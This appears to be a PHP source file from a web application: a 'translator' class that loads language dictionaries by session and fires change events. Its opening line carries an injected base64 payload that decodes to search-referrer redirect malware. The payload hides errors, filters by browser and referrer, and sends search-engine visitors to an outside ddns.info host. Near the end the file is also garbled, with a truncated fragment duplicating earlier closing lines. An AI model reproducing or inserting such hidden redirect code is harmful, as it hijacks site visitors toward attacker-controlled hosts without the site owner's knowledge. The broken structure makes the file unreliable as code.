<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(dirname(__FILE__))."/utils/log.php");

class translator {

  var $language   = null;
  var $dictionary = array();
  var $lanugages  = array();
  var $storages   = array();
  var $events;

  function translator() {
    
    $this->events["on_change"]           = array();

    $this->add("en", "en", "English");
    
  }

  function add($name, $folder, $title) {
      
    $this->languages[$name] = array("name" => $name, "folder" => $folder, "title" => $title);
    
  }
  
  function switch_language($new_language) {

    $current_language = session_get('language');
    if (isset($this->languages[$new_language]) and ($current_language != $new_language)) {
      session_set('language', $new_language);
      $this->call_event("on_change", $new_language);
    }

    $this->language = session_get("language");
    
    if ($this->language && ($this->language != "en")) {
      $this->attach(dirname(__FILE__)."/lang/".$this->languages[$this->language]["folder"]);
      $this->attach(CONFIG_PATH."lang/".$this->languages[$this->language]["folder"]);
      foreach ($this->storages as $storage) {
        $this->attach($storage.$this->languages[$this->language]["folder"]);
      }
      logme("Language: ".$this->languages[$this->language]["title"]);
    }

  }

  function load() {

    if (get(URL_PARAM_LANG))
      $this->switch_language(get(URL_PARAM_LANG));
    if (!session_get("language"))
      $this->switch_language(get_config("language"));
    if (!session_get("language"))
      $this->switch_language("en");
    if (!isset($this->languages[session_get("language")]))
      $this->switch_language("en");
    if (!$this->language)
      $this->switch_language(session_get("language"));

  }
  
  function attach($file_name) {

    if ($this->language != "en") {  
      if (file_exists($file_name)) {   
        $dictionary = array();
        require_once($file_name);
        $this->dictionary = array_merge($this->dictionary, $dictionary);
      }
    }

  }
  
  function add_translation_storage($folder, $load = false) {
    
    if ($load) {
      $this->attach($folder.$this->languages[$this->language]["folder"]);
    } else {
      $this->storages[] = $folder;
    }
    
  }

  function get($string) {
   
    if ($string) {
      if ($this->language and ($this->language != "en")) {
        if (array_key_exists($string, $this->dictionary))
          return $this->dictionary[$string];
        else {
          logme('Cannot translate: ['.$string.']', 'LNG');
          return $string;
        }
      } else   
        return $string;
    } else   
      return $string;

  }

  function set($string, $translation) {

    $this->dictionary[$string] = $translation;

  }
  
  function call_event($event, $lang) {

    foreach($this->events[$event] as $callback) {
      $callback($lang);
    }
  
  }


  function on_change($method) {

    array_push($this->events["on_change"], $method);

  }
  

}

functio_change"], $method);

  }
  

}

function trn($string) { global $trn; return $trn->get($string); }

?>